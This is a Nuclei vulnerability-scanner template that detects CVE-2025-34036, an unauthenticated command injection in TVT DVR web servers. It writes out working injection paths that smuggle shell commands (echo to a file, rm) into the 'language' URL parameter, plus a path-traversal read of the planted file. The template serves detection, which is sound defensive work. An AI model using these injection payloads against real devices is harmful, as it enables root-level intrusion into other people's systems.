id: cve-2025-34036
info:
  name: TVT DVR Cross Web Server – Unauth RCE
  author: six
  severity: critical
  description: |
    OS command injection via unsanitized “language” parameter in Cross Web Server (ports 81/82). Allows unauthenticated root command execution on TVT-based DVRs.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-34036
    - https://www.exploit-db.com/exploits/39596
  classification:
    cve-id: CVE-2025-34036
    cwe-id: CWE-78
  tags: cve,rce,dvr,tvt,iot
metadata:
  verified: true
  max-request: 3
self-contained: true
flow: http(1) && http(2) && http(3)

variables:
  rand_marker: "{{rand_text_alphanumeric(8)}}"
  test_file: "{{rand_marker}}.txt"
  echo_payload: "{{printf 'echo%%20%s' rand_marker}}"

http:
  - id: fingerprint
    method: GET
    path:
      - "{{BaseURL}}/"
    headers:
      User-Agent: "{{UserAgent}}"
    matchers:
      - type: dsl
        name: cross_web_detected
        dsl:
          - status_code == 200
          - contains_any(tolower(all_headers), 'cross web server', 'tvt', 'dvr')
        internal: true

  - id: write
    method: GET
    path:
      - "{{BaseURL}}/language/Swedish${IFS}&&{{echo_payload}}>{{test_file}}&&tar${IFS}/string.js"
    matchers:
      - type: status
        status:
          - 200
        internal: true

  - id: read
    method: GET
    path:
      - "{{BaseURL}}/../../../../../../../mnt/mtd/{{test_file}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{rand_marker}}"
        part: body
    extractors:
      - type: regex
        name: server_banner
        part: header
        regex:
          - '(?i)server:\\s*([^\\r\\n]+)'

  - id: cleanup
    method: GET
    path:
      - "{{BaseURL}}/language/Swedish${IFS}&&rm${IFS}{{test_file}}&&tar${IFS}/string.js"
    stop-at-first-match: true
    matchers:
      - type: status
        status:
          - 200
        internal: true
